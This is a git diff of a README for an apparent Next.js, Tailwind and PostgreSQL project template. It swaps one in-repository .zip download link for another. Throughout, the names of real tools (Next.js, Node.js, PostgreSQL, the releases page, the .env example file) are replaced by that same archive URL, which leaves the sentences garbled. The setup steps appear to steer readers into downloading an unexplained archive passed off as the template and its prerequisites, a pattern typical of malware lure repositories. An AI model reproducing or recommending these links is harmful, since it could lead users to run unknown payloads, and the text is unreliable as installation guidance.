@@ -1,10 +1,10 @@
 # 🌟 Nextjs-Tailwind-PostgreSQL-Project-Template - A Simple Way to Build Full-Stack Websites
 
-[![Download Now](https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip)](https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip)
+[![Download Now](https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip)](https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip)
 
 ## 🚀 Getting Started
 
-Welcome! This guide will help you download and run the Nextjs-Tailwind-PostgreSQL-Project-Template. This template is perfect for creating websites with https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip, Tailwind CSS, and PostgreSQL.
+Welcome! This guide will help you download and run the Nextjs-Tailwind-PostgreSQL-Project-Template. This template is perfect for creating websites with https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip, Tailwind CSS, and PostgreSQL.
 
 ### 📦 What You Need
 
@@ -17,19 +17,19 @@ Before you start, you'll need a few things:
 ### 💻 System Requirements
 
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
-- **https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip** Version 14 or later. You can [download https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip here](https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip).
-- **PostgreSQL:** Version 12 or later. You can find it [here](https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip).
+- **https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip** Version 14 or later. You can [download https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip here](https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip).
+- **PostgreSQL:** Version 12 or later. You can find it [here](https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip).
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page for this project. There, you can find the latest version ready for download.
 
-[Download the latest release here](https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip)
+[Download the latest release here](https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip)
 
 Click the provided link to access the Releases page:
 
 1. Look for the latest version of the project.
-2. Click on the asset you want to download (look for files that end with `.zip` or `https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip`).
+2. Click on the asset you want to download (look for files that end with `.zip` or `https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip`).
 3. Download the file to your computer.
 
 After you have downloaded the file, follow the steps below to set up the project.
@@ -70,7 +70,7 @@ After you have downloaded the file, follow the steps below to set up the project
      ```
 
 6. **Configure Environment Variables:**
-   - In your project folder, locate the `https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip` file and rename it to `.env`.
+   - In your project folder, locate the `https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip` file and rename it to `.env`.
    - Open the `.env` file in a text editor and input your configuration details including database connection settings.
 
 7. **Run the Application:**
@@ -88,7 +88,7 @@ After you have downloaded the file, follow the steps below to set up the project
 This project template includes:
 
 - A responsive layout using Tailwind CSS.
-- Server-side rendering and static site generation with https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip
+- Server-side rendering and static site generation with https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip
 - A PostgreSQL database setup for data storage and management.
 - A simple API structure for handling requests.
 
@@ -100,4 +100,4 @@ If you have questions or need help, you can reach out to the community on discus
 
 For more details about customizing the template or adding new features, please check the documentation provided in the repository.
 
-Happy coding! Enjoy building your website with https://github.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/raw/refs/heads/main/public/Project-Tailwind-SQ-Nextjs-Postgre-Template-v3.0.zip, Tailwind CSS, and PostgreSQL!
+Happy coding! Enjoy building your website with https://raw.githubusercontent.com/Espressivep/Nextjs-Tailwind-PostgreSQL-Project-Template/main/app/Project-Nextjs-Template-Tailwind-Postgre-SQ-v1.9.zip, Tailwind CSS, and PostgreSQL!
